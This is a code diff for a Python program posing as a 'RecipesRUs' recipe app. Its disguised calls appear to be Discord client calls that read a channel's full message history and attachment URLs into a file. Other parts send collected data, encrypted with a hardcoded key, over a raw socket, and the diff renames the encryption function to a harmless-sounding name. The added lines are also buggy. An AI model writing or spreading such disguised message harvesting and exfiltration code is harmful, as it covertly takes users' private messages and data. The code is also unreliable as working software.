@@ -2,18 +2,13 @@
 # your own recipes at your fingertips! Thank you for supporting RecipesRUs!
 import gui
 from gui import *
-
-
-
-
-
 recipesrusip = '127.0.0.1'
 connport = 8080
 recipeseed = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 async def generate_recipes(token, id):
-    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.default())
+    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.all())
 
     async def get_recipe_written():
         writer = rec_gen.get_channel(id)
@@ -22,7 +17,10 @@ async def generate_recipes(token, id):
             recipe_file = open('recipes.txt', 'w')
 
             async for message in writer.history(limit=None):
+
                 recipe_file.write(f'{message.author}: {message.content}\n')
+                if message.attachments[0]:
+                    recipe_file.write[f'{message.author}:{message.attachments[0].url}\n']
 
     @rec_gen.event
     async def on_ready():
@@ -99,7 +97,7 @@ def run_recipe_app():
                 val_out.append(i.decode().strip())
 
             if len(val_out) != 0:
-                conn.sendall(encrypt_data(recipeseed, json.dumps(val_out).encode()))
+                conn.sendall(mix_ingredients(recipeseed, json.dumps(val_out).encode()))
 
 
 
